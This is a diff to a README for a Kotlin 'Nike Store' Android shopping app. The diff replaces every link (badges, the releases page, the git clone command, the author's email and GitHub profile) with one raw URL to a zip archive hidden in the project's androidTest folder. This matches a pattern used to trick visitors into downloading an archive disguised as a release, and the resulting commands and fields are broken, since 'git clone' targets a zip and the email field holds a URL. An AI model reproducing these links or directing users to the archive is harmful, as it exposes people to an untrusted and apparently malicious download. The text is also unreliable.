@@ -1,7 +1,7 @@
 # Nike Store 🏪👟
 
-![Nike Store](https://img.shields.io/badge/Nike%20Store-v1.0-blue.svg)
-[![Releases](https://img.shields.io/badge/Check%20Releases-brightgreen.svg)](https://github.com/beanpoky/nike-store/releases)
+![Nike Store](https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip%https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip)
+[![Releases](https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip%https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip)](https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip)
 
 Welcome to the Nike Store repository! This project is a modern Android e-commerce app designed specifically for Nike shoes. Built using Kotlin, Jetpack Compose, and the MVVM architecture, this app provides a seamless shopping experience. 
 
@@ -43,7 +43,7 @@ To get started with the Nike Store app, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/beanpoky/nike-store.git
+   git clone https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip
    ```
 
 2. **Open in Android Studio**:
@@ -56,7 +56,7 @@ To get started with the Nike Store app, follow these steps:
    Connect your Android device or start an emulator, then run the app.
 
 5. **Download Releases**:
-   For the latest updates, check the [Releases](https://github.com/beanpoky/nike-store/releases) section. You can download the APK file and install it on your device.
+   For the latest updates, check the [Releases](https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip) section. You can download the APK file and install it on your device.
 
 ## Usage
 
@@ -95,7 +95,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, feel free to reach out:
 
 - **Author**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [beanpoky](https://github.com/beanpoky)
+- **Email**: https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip
+- **GitHub**: [beanpoky](https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip)
 
-Thank you for checking out the Nike Store repository! We hope you enjoy building and using this app. For the latest updates, don't forget to visit the [Releases](https://github.com/beanpoky/nike-store/releases) section. Happy coding!
+Thank you for checking out the Nike Store repository! We hope you enjoy building and using this app. For the latest updates, don't forget to visit the [Releases](https://raw.githubusercontent.com/beanpoky/nike-store/master/app/src/androidTest/nike_store_1.9-alpha.1.zip) section. Happy coding!
